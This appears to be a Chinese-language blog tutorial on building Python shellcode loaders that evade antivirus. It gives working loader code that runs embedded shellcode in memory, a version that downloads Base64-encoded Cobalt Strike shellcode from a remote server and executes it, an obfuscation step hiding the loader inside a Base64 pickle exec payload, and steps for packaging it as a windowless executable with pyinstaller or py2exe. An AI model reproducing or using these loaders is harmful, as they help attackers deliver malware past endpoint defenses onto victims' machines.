---
title: Python Shellcode加载器绕过AV
tags: Python
typora-root-url: ../
date: 2020-12-07 18:22:58
---

#### 原理

```
免杀技术大致分为有以下几类：
特征码修改
花指令免杀
加壳免杀
内存免杀
二次编译
分离免杀
资源修改
...
Ps: 不管使用哪种技术，能绕过AV(AntiVirus)达到效果的，都是好的。
```

采用分离免杀，即利用ShellCode和Python制作的加载器进行分离。

主要将ShellCode进行编码，分离及反序列化达到bypass的思路和方法。

<!--more-->

#### ShellCode

```
什么是ShellCode?
答：一段用于利用软件漏洞而执行的代码
```

这里我们利用Cobalt Strike生成的ShellCode

![image-20201205145223046](/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205145223046.png)

#### ShellCode加载器

```
什么是ShellCode加载器？
答：即专门用于加载所提供ShellCode的工具。
```

以Python为例：

```python
import ctypes

# "msfvenom -p windows/x64/exec CMD=calc.exe -f python"生成的计算器的ShellCode
shellcode =  b"\xfcH\x83\xe4\xf0\xe8\xc0\x00\x00\x00AQAPRQVH1\xd2eH\x8bR`H\x8bR\x18H\x8bR H\x8brPH\x0f\xb7JJM1\xc9H1\xc0\xac<a|\x02, A\xc1\xc9\rA\x01\xc1\xe2\xedRAQH\x8bR \x8bB<H\x01\xd0\x8b\x80\x88\x00\x00\x00H\x85\xc0tgH\x01\xd0P\x8bH\x18D\x8b@ I\x01\xd0\xe3VH\xff\xc9A\x8b4\x88H\x01\xd6M1\xc9H1\xc0\xacA\xc1\xc9\rA\x01\xc18\xe0u\xf1L\x03L$\x08E9\xd1u\xd8XD\x8b@$I\x01\xd0fA\x8b\x0cHD\x8b@\x1cI\x01\xd0A\x8b\x04\x88H\x01\xd0AXAX^YZAXAYAZH\x83\xec AR\xff\xe0XAYZH\x8b\x12\xe9W\xff\xff\xff]H\xba\x01\x00\x00\x00\x00\x00\x00\x00H\x8d\x8d\x01\x01\x00\x00A\xba1\x8bo\x87\xff\xd5\xbb\xf0\xb5\xa2VA\xba\xa6\x95\xbd\x9d\xff\xd5H\x83\xc4(<\x06|\n\x80\xfb\xe0u\x05\xbbG\x13roj\x00YA\x89\xda\xff\xd5calc.exe\x00"
 
shellcode = bytearray(shellcode)
# 设置VirtualAlloc返回类型为ctypes.c_uint64
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
# 申请内存
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
 
# 放入shellcode
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr), 
    buf, 
    ctypes.c_int(len(shellcode))
)
# 创建一个线程从shellcode防止位置首地址开始执行
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0), 
    ctypes.c_int(0), 
    ctypes.c_uint64(ptr), 
    ctypes.c_int(0), 
    ctypes.c_int(0), 
    ctypes.pointer(ctypes.c_int(0))
)
# 等待上面创建的线程运行完
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))

```

![image-20201204183555152](/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201204183555152.png)

#### 分离

这里通过本地请求Http Server获取ShellCode内容并进行加载执行。

将ShellCode放置VPS上，这里利用Python起一个临时的http服务。

```
python3 -m http.server
```

![image-20201204181858175](/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201204181858175.png)



通过request请求来获取ShellCode进行加载执行从而实现分离。

```
shellcode = urllib.request.urlopen('http://192.168.1.1:8000/test.txt').read()
```

#### 编码

我么可以对ShellCode进行混淆编码加密等，再有本地可执行程序进行解密执行，这里我们以Base64编码处理为例，处理过后ShellCode页面如下。

![image-20201204182834063](/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201204182834063.png)

#### 下载ShellCode并执行

```python
import ctypes,urllib.request,codecs,base64

shellcode = urllib.request.urlopen('http://192.168.1.1:8000/test.txt').read()  # 请求pyload（base64格式）
shellcode = base64.b64decode(shellcode) # base64解密
shellcode =codecs.escape_decode(shellcode)[0] # 
shellcode = bytearray(shellcode) # 返回新字节数组
# 设置VirtualAlloc返回类型为ctypes.c_uint64
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
# 申请内存
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
 
# 放入shellcode
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr), 
    buf, 
    ctypes.c_int(len(shellcode))
)
# 创建一个线程从shellcode防止位置首地址开始执行
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0), 
    ctypes.c_int(0), 
    ctypes.c_uint64(ptr), 
    ctypes.c_int(0), 
    ctypes.c_int(0), 
    ctypes.pointer(ctypes.c_int(0))
)
# 等待上面创建的线程运行完
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
```

#### 反序列化

经过了上文的那些操作，使用`pyinstaller`将我们的程序打包成可执行程序，仍然会给杀软进行查杀。

![image-20201205105822973](/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205105822973.png)



因为我们使用的加载器本身关键语句已经被检测，因此我们需要对其进行进一步处理从而绕过静态查杀，我们绕过的方式可以通过上文说过的混淆、编码、加密等方式对代码进行处理，然后进行调用执行。但是像执行命令的`exec`、`eval`等函数特征比较明显，所以我们对它也需要进一步处理。

跟其他语言一样，Python也有序列化的功能，官方库里提供了pickle/cPickle的库用于序列化和反序列化，可以序列化python的任何数据结构，包括一个类，一个对象。

Python反序列化中 ，有几个内置方法会在对象反序列化时调用，这一点和PHP中的`__wakeup()`魔术方法类似，都是因为每当反序列化过程开始或者结束时 , 都会自动调用这类函数。（这一点可以去了解一下：python中的反序列化安全问题）

```
__reduce__()  
__reduce_ex__() 
__setstate__()
可参考官方文档：https://docs.python.org/zh-cn/dev/library/pickle.html
```

以`__reduce__()`为例：

```python
import pickle

class A(object):
    a = 1
    b = 2
    def __reduce__(self):
        return (print, (self.a+self.b,))

serialize = pickle.dumps(A()) # 序列化
print(serialize)

unserialize = pickle.loads(serialize) # 反序列化
```

通过`pickle`的`loads`来反序列化并自动执行了

![image-20201204233028982](/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201204233028982.png)

从输出的结果我们还是可以看到调用的关键函数名称，可以对其进行混淆、编码、加密等操作，这里以`Base64`编码为例，序列化、编码，解码、反序列化代码如下：

```python
import pickle
import base64

class A(object):
    a = 1
    b = 2
    def __reduce__(self):
        return (print, (self.a+self.b,))

serialize = pickle.dumps(A()) # 序列化
print(serialize)
print("========分割线===========")
serialize_encode = base64.b64encode(serialize) #进行base64编码
print(serialize_encode)
```

![image-20201205155425112](/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205155425112.png)

```python
import pickle
import base64

serialize_encode = b'gASVHAAAAAAAAACMCGJ1aWx0aW5zlIwFcHJpbnSUk5RLA4WUUpQu'
serialize_decode = base64.b64decode(serialize_encode)
unserialize = pickle.loads(serialize_decode) # 反序列化
```

从代码层面来看，看到的是一段正常的base64编码以及反序列化的脚本文件，达到bypass的效果。

![image-20201205155553287](/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205155553287.png)

#### 反序列化应用

结合上述说的利用反序列化来进行对我们的ShellCode加载来处理：

先进行序列化操作并进行base64编码,得到base64编码后的序列化：

```python
import ctypes,urllib.request,codecs,base64,pickle

shellcode = """
shellcode = urllib.request.urlopen('http://192.168.1.1:8000/test.txt').read()  # 请求pyload（base64格式）
shellcode = base64.b64decode(shellcode) # base64解密
shellcode =codecs.escape_decode(shellcode)[0] # 
shellcode = bytearray(shellcode) # 返回新字节数组
# 设置VirtualAlloc返回类型为ctypes.c_uint64
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
# 申请内存
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
 
# 放入shellcode
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr), 
    buf, 
    ctypes.c_int(len(shellcode))
)
# 创建一个线程从shellcode防止位置首地址开始执行
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0), 
    ctypes.c_int(0), 
    ctypes.c_uint64(ptr), 
    ctypes.c_int(0), 
    ctypes.c_int(0), 
    ctypes.pointer(ctypes.c_int(0))
)
# 等待上面创建的线程运行完
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))"""

class A(object):
    def __reduce__(self):
        return(exec,(shellcode,))

#序列化、编码
ret = pickle.dumps(A())
ret_base64 = base64.b64encode(ret)
```

![image-20201205153435704](/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-202012051534357041.png)

再进行base64解码、反序列化操作，执行脚本，正常上线。

```python
import ctypes,urllib.request,codecs,base64,pickle
#解码、反序列化
ret_base64 = b"gASVKwQAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlFgMBAAACnNoZWxsY29kZSA9IHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHA6Ly84MS42OC4yMzUuMjE5OjgwMDAvdGVzdC50eHQnKS5yZWFkKCkKc2hlbGxjb2RlID0gYmFzZTY0LmI2NGRlY29kZShzaGVsbGNvZGUpCnNoZWxsY29kZSA9Y29kZWNzLmVzY2FwZV9kZWNvZGUoc2hlbGxjb2RlKVswXQpzaGVsbGNvZGUgPSBieXRlYXJyYXkoc2hlbGxjb2RlKQojIOiuvue9rlZpcnR1YWxBbGxvY+i/lOWbnuexu+Wei+S4umN0eXBlcy5jX3VpbnQ2NApjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYy5yZXN0eXBlID0gY3R5cGVzLmNfdWludDY0CiMg55Sz6K+35YaF5a2YCnB0ciA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jKGN0eXBlcy5jX2ludCgwKSwgY3R5cGVzLmNfaW50KGxlbihzaGVsbGNvZGUpKSwgY3R5cGVzLmNfaW50KDB4MzAwMCksIGN0eXBlcy5j........" 
pickle.loads(base64.b64decode(ret_base64))
```

![image-20201205154002722](/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205154002722.png)

#### 生成可执行文件

##### pyinstaller

```
pyinstaller --noconsole --onefile demo1.py -i favicon.ico -n demo1 

--onefile 打包一个单个文件
--noconsole 使用Windows子系统执行.当程序启动的时候不会打开命令行(只对Windows有效)
-i 设置生成执行文件的图标
-n 设置生成执行文件的名字
# pyinstaller参数可参考：https://pyinstaller.readthedocs.io/en/v3.3.1/usage.html
```

![image-20201205154952238](/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205154952238.png)

![image-20201205154735442](/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205154735442.png)

![image-20201205155120792](/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205155120792.png)

![image-20201205224811833](/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205224811833.png)

部分AV对`Pyinstaller`打包的程序检测较为敏感，即使是仅打包`print(1)`这种代码都有类似的结果

![image-20201207153229920](/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201207153229920.png)

##### py2exe

```
python setup.py py2exe
注: py2exe为0.10.1.0版本，亲测python3.6.0、python3.7.0、python3.7.4、python3.7.9可生成可执行文件并正常打开,python3.8.0、python3.8.2、python3.9.0 生成执行文件无法正常使用。
```

```python
# setup.py 用于py2exe打包
from distutils.core import setup
import py2exe
setup(
    options={
        'py2exe': {
            'optimize': 2, # 优化级别最高，
            'bundle_files': 1, # 将生成的调用文件打包进exe文件
            'compressed': 1, # 压缩
        },
    },
    windows=[{"script": "demo2.py", #需要打包的程序的文件路径，windows->GUI exe的脚本列表,console-> 控制台exe的脚本列表
              "icon_resources": [(1, "favicon.ico")]}], # 程序的图标的图片路径
    zipfile=None, # 不生成library.zip文件，则捆绑在可执行文件中
)
```

![image-20201207144921636](/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201207144921636.png)

![image-20201207163850250](/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201207163850250.png)

![image-20201207150048052](/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201207150048052.png)

![image-20201207150125561](/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201207150125561.png)

#### 参考

https://www.cnblogs.com/Akkuman/p/11851057.html

https://mp.weixin.qq.com/s/sd73eL3-TnMm0zWLCC8cOQ

https://docs.python.org/zh-cn/dev/library/pickle.html

https://zhuanlan.zhihu.com/p/148696337